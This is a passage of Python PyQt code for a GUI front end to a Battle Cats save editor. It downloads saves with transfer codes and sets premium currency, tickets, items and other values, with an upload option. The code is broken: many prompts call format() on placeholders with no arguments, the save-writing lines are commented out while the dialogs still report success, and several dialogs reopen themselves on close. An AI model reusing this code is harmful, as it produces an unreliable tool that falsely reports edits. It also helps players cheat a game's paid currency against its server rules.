        self.listWidgetLeft.addItem('5. Into the Future 2')
        self.listWidgetLeft.addItem('6. Into the Future 3')
        self.listWidgetLeft.addItem('7. Cats of the Cosmos 1')
        self.listWidgetLeft.addItem('8. Cats of the Cosmos 2')
        self.listWidgetLeft.addItem('9. Cats of the Cosmos 3')

        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
        
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = TreasuresInputDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(TreasuresInputDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal


class OutbreakDialog(QDialog):
    def __init__(self):
        super(OutbreakDialog, self).__init__()

        self.setWindowTitle("Move Levels to the Right")
        self.window_width, self.window_height = 120, 80
        self.setMinimumSize(self.window_width, self.window_height)

        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()


        self.listWidgetLeft.addItem('1. Empire of Cats 1')
        self.listWidgetLeft.addItem('2. Empire of Cats 2')
        self.listWidgetLeft.addItem('3. Empire of Cats 3')
        self.listWidgetLeft.addItem('4. Into the Future 1')
        self.listWidgetLeft.addItem('5. Into the Future 2')
        self.listWidgetLeft.addItem('6. Into the Future 3')
        self.listWidgetLeft.addItem('7. Cats of the Cosmos 1')

        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
        
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = OutbreakDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(OutbreakDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal

class MainLevelInputDialog(QDialog):
    def __init__(self):
        super(MainLevelInputDialog, self).__init__()

        self.setWindowTitle("Move Levels to the Right")
        self.window_width, self.window_height = 120, 80
        self.setMinimumSize(self.window_width, self.window_height)

        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()


        self.listWidgetLeft.addItem('1. Empire of Cats 1')
        self.listWidgetLeft.addItem('2. Empire of Cats 2')
        self.listWidgetLeft.addItem('3. Empire of Cats 3')
        self.listWidgetLeft.addItem('4. Into the Future 1')
        self.listWidgetLeft.addItem('5. Into the Future 2')
        self.listWidgetLeft.addItem('6. Into the Future 3')
        self.listWidgetLeft.addItem('7. Cats of the Cosmos 1')
        self.listWidgetLeft.addItem('8. Cats of the Cosmos 2')
        self.listWidgetLeft.addItem('9. Cats of the Cosmos 3')

        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
        
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = MainLevelInputDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(MainLevelInputDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal
    

class WindowClass2(QMainWindow, form_class2) :
    def __init__(self) :
        super().__init__()
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon.png'))
        self.loadfile_btn.clicked.connect(self.loadfile)
        self.download_btn.clicked.connect(self.downloadfile)
        
        

        
    def downloadfile(self):
        try:
            now = datetime.datetime.now()
            savetime = str(now).split(".")[0]
            
            path = helper.save_file(
                "Save save data",
                helper.get_save_file_filetype(),
                helper.get_save_path_home(),
            )
            BCSFE_Python.helper.set_save_path(path)
            country_code = self.versionbox.currentText()
            transfer_code = self.transfercode_input.text()
            confirmation_code = self.confirmcode_input.text()
            game_version = self.version_input_2.text()
            game_version = helper.str_to_gv(game_version)

            save_data = BCSFE_Python.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
            self.progressBar.setValue(31)
            save_data = patcher.patch_save_data(save_data, country_code)
            self.progressBar.setValue(83)
            global save_stats
            save_stats = parse_save.start_parse(save_data, country_code)
            self.progressBar.setValue(100)
            self.close()
            self.w = WindowClass()
            self.w.show()
        except Exception as e:
            QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                    QMessageBox.Ok)
            self.progressBar.setValue(0)
            pass


    def loadfile(self):
        try:
            #locale_manager = BCSFE_Python.locale_handler.LocalManager.from_config()
            path = helper.select_file(
                "Select Save File",
                helper.get_save_file_filetype(),
                initial_file=helper.get_save_path_home(),
            )
            BCSFE_Python.helper.set_save_path(path)
            self.progressBar.setValue(31)
            
            data = helper.load_save_file(path)
            global save_stats
            save_stats = data["save_stats"]
            save_data: bytes = data["save_data"]
            country_code = "kr"#save_stats["version"]
            self.progressBar.setValue(67)
            save_data = patcher.patch_save_data(save_data, country_code)
            self.progressBar.setValue(78)
            save_stats = parse_save.start_parse(save_data, country_code)
            self.progressBar.setValue(100)
            
            myWindow.close()
            self.w = WindowClass()
            self.w.show()
            
            
        except Exception as e:
            QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                    QMessageBox.Ok)
            self.progressBar.setValue(0)
            pass
            



class WindowClass(QMainWindow, form_class):
    def __init__(self) :
        super().__init__()
        #global save_stats
        
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon.png'))
        self.catfood.clicked.connect(self.CatfoodConnect)
        self.xp.clicked.connect(self.XPConnect)
        self.tickets.clicked.connect(self.TicketConnect)
        self.np.clicked.connect(self.NPConnect)
        self.leadership.clicked.connect(self.LeadershipConnect)
        self.battleitem.clicked.connect(self.BattleItemConnect)

        self.catseye.clicked.connect(self.CatseyeConnect)
        self.catamins.clicked.connect(self.CataminConnect)
        self.applybutton_2.clicked.connect(self.edit_cats)
        self.applybutton_3.clicked.connect(self.savefile)
        self.applybutton_4.clicked.connect(self.upload_data)
        self.select_main_levels_btn.clicked.connect(self.connect_main_level_dialog)
        self.Treasures_btn.clicked.connect(self.connect_treasures_dialog)
        self.legend_btn.clicked.connect(self.LegendStoryClear)
        self.uncanny_legend.clicked.connect(self.UncannyClear)
        self.aku_stages.clicked.connect(self.AkuStagesClear)
        self.filibuster.clicked.connect(self.filibuster_reclear)
        self.outbreakbtn.clicked.connect(self.OutbreakClear)
        self.reset_token.clicked.connect(self.ResetToken)
        self.goldpass.clicked.connect(self.GoldPass)
        self.gacha_seed.clicked.connect(self.GachaSeed)
        self.playtime.clicked.connect(self.PlayTime)
        self.enemy_guide.clicked.connect(self.EnemyGuide)
        self.applybutton_json.clicked.connect(self.JSON)
        self.applybutton_convert.clicked.connect(self.ConvertVersion)
        self.fix_equip.clicked.connect(self.FixEquip)
        self.fix_gamatoto.clicked.connect(self.FixGamatoto)
        self.configpath.clicked.connect(self.EditConfigPath)

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'Message', 'Are you sure to quit?',
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

        if reply == QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()
    
    def CatfoodConnect(self):
        tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Cat Food Value\n\nCurrent: {}\nMAX: 45000'.format())#save_stats["cat_food"]["Value"])))
        if not ok:
            QMessageBox.critical(self, 'Error', 'Cat Food must not be empty.',
                                        QMessageBox.Ok)
        elif ok:
            tre_id = int(tre_id)
            if tre_id >= 45001:
                QMessageBox.warning(self, 'Warning', 'Max value for [Cat Food] is 45000',
                                        QMessageBox.Ok)
                self.progressbar.setValue(0)
            else:
                #save_stats["cat_food"]["Value"] = tre_id
                self.progressbar.setValue(100)
                QMessageBox.information(self, 'Success', 'Successfully changed [Cat Food] value to {}'.format(tre_id),
                                QMessageBox.Ok)
                self.progressbar.setValue(0)

    def XPConnect(self):
        tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter XP Value\n\nCurrent: {}\nMAX: 99999999'.format())#save_stats["xp"]["Value"]))
        if not ok:
            QMessageBox.critical(self, 'Error', 'XP must not be empty.',
                                        QMessageBox.Ok)
        elif ok:
            tre_id = int(tre_id)
            if tre_id >= 100000000:
                QMessageBox.warning(self, 'Warning', 'Max value for [XP] is 99999999',
                                        QMessageBox.Ok)
                self.progressbar.setValue(0)
            else:
                #save_stats["xp"]["Value"] = tre_id
                self.progressbar.setValue(100)
                QMessageBox.information(self, 'Success', 'Successfully changed [XP] value to {}'.format(tre_id),
                                QMessageBox.Ok)
                self.progressbar.setValue(0)
    
    def TicketConnect(self):
        dialog = TicketInputDialog()
        execute = dialog.exec_()
        if execute:
            self.progressbar.setValue(0)
            print("Tickets: {}".format(execute))
            listlength = len(execute)
            print("List Length: {}".format(listlength))
            i = 0
            for i in range(listlength):
                if "Normal Ticket" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Normal Ticket Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["normal_tickets"]["Value"], 2999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 3000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Normal Ticket] is 2999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["normal_tickets"]["Value"] = tre_id

                elif "Rare Ticket" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Rare Ticket Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["rare_tickets"]["Value"], 299))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 300:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Rare Ticket] is 299',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["rare_tickets"]["Value"] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Platinum Ticket" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Platinum Ticket Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["platinum_tickets"]["Value"], 9))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Platinum Ticket] is 9',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["platinum_tickets"]["Value"] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Legend Ticket" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Legend Ticket Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["legend_tickets"]["Value"], 4))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 5:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Normal Ticket] is 4',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["legend_tickets"]["Value"] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                else:
                    QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                    break
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Applied Values',
                            QMessageBox.Ok)
            self.progressbar.setValue(0)
    
    def NPConnect(self):
        tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter NP Value\n\nCurrent: {}\nMAX: 9999'.format())#save_stats["np"]["Value"]))
        if not ok:
            QMessageBox.critical(self, 'Error', 'NP must not be empty.',
                                        QMessageBox.Ok)
        elif ok:
            tre_id = int(tre_id)
            if tre_id >= 10000:
                QMessageBox.warning(self, 'Warning', 'Max value for [NP] is 9999',
                                        QMessageBox.Ok)
                self.progressbar.setValue(0)
            else:
                #save_stats["np"]["Value"] = tre_id
                self.progressbar.setValue(100)
                QMessageBox.information(self, 'Success', 'Successfully changed [NP] value to {}'.format(tre_id),
                                QMessageBox.Ok)
                self.progressbar.setValue(0)
            
    def LeadershipConnect(self):
        tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Leadership Value\n\nCurrent: {}\nMAX: 9999'.format())#save_stats["leadership"]["Value"]))
        if not ok:
            QMessageBox.critical(self, 'Error', 'Leadership must not be empty.',
                                        QMessageBox.Ok)
        elif ok:
            tre_id = int(tre_id)
            if tre_id >= 10000:
                QMessageBox.warning(self, 'Warning', 'Max value for [Leadership] is 9999',
                                        QMessageBox.Ok)
                self.progressbar.setValue(0)
            else:
                #save_stats["leadership"]["Value"] = tre_id
                self.progressbar.setValue(100)
                QMessageBox.information(self, 'Success', 'Successfully changed [Leadership] value to {}'.format(tre_id),
                                QMessageBox.Ok)
                self.progressbar.setValue(0)

    def BattleItemConnect(self):
        dialog = BattleItemInputDialog()
        execute = dialog.exec_()
        if execute:
            self.progressbar.setValue(0)
            print("Items: {}".format(execute))
            listlength = len(execute)
            print("List Length: {}".format(listlength))
            i = 0
            for i in range(listlength):
                if "Speed Up" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Speed Up Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["battle_items"][0], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Speed Up] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["battle_items"][0] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Treasure Radar" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Treasure Radar Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["battle_items"][1], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Treasure Radar] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["battle_items"][1] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Rich Cat" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Rich Cat Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["battle_items"][2], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Rich Cat] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["battle_items"][2] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Cat CPU" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Cat CPU Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["battle_items"][3], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Cat CPU] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["battle_items"][3] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Cat Jobs" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Cat Jobs Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["battle_items"][4], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Cat Jobs] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                            #save_stats["battle_items"][4] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Sniper the Cat" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Sniper the Cat Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["battle_items"][5], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Sniper the Cat] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["battle_items"][5] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "SELECT ALL (PUT THIS ONLY)" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter ALL Value\n\nMAX: {}'.format(9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [ALL] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["battle_items"][0] = tre_id
                            #save_stats["battle_items"][1] = tre_id
                            #save_stats["battle_items"][2] = tre_id
                            #save_stats["battle_items"][3] = tre_id
                            #save_stats["battle_items"][4] = tre_id
                            #save_stats["battle_items"][5] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                else:
                    QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                    break
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Applied Values',
                            QMessageBox.Ok)
            self.progressbar.setValue(0)


        
        
    
    def CatseyeConnect(self):
        dialog = CatseyeInputDialog()
        execute = dialog.exec_()
        if execute:
            self.progressbar.setValue(0)
            print("Items: {}".format(execute))
            listlength = len(execute)
            print("List Length: {}".format(listlength))
            i = 0
            for i in range(listlength):
                if "Normal" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Normal Catseye Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catseyes"][0], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Normal] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][0] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "EX" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter EX Catseye Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catseyes"][1], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [EX] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][1] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Rare" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Rare Catseye Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catseyes"][2], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Rare] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][2] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Super Rare" in str(execute[i]):
